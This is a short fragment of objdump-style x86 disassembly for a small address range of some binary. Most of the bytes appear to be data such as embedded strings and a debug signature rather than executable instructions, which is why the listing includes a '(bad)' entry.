  4339b0:	add    BYTE PTR [edi+0x0],dl
  4339b3:	aaa    
  4339b4:	add    BYTE PTR [eax],bh
  4339b6:	add    BYTE PTR [edi+0x0],bl
  4339b9:	pop    eax
  4339ba:	add    BYTE PTR [edi+0x0],cl
  4339bd:	inc    edi
  4339be:	add    BYTE PTR [edi+0x0],bl
  4339c1:	xor    al,0x0
  4339c3:	push   eax
  4339c4:	add    BYTE PTR [ecx+0x0],cl
  4339c7:	push   ebp
  4339c8:	add    BYTE PTR [eax],al
  4339ca:	add    BYTE PTR [edi+0x0],dl
  4339cd:	push   esp
  4339ce:	add    BYTE PTR [ebx+0x0],cl
  4339d1:	add    BYTE PTR [eax],al
  4339d3:	add    BYTE PTR [edx+0x53],dl
  4339d6:	inc    esp
  4339d7:	push   ebx
  4339d8:	adc    dh,cl
  4339da:	in     eax,dx
  4339db:	lock mov dl,0xee
  4339de:	in     eax,dx
  4339df:	dec    ebx
  4339e0:	(bad)  
  4339e1:	fs xchg edx,eax
  4339e3:	test   DWORD PTR [ebx],ebx
  4339e5:	or     ecx,ebp
  4339e7:	pop    es
  4339e8:	sbb    eax,DWORD PTR [eax]
  4339ea:	add    BYTE PTR [eax],al
  4339ec:	push   esp
  4339ed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  4339f1:	addr16 push edi
  4339f3:	bound  bx,DWORD PTR [edx+0x45]
  4339f7:	outs   dx,BYTE PTR ds:[esi]
  4339f8:	pop    esp
  4339f9:	je     0x433a6e
  4339fb:	ja     0x433a3e
  4339fd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a05:	js     0x433a76
  433a07:	jp     0x433a78
  433a09:	jns    0x433a6f
  433a0b:	jp     0x433a75
  433a0d:	je     0x433a73
  433a0f:	jp     0x433a73
  433a11:	cs jo  0x433a78
  433a14:	bound  eax,QWORD PTR [eax]
	...
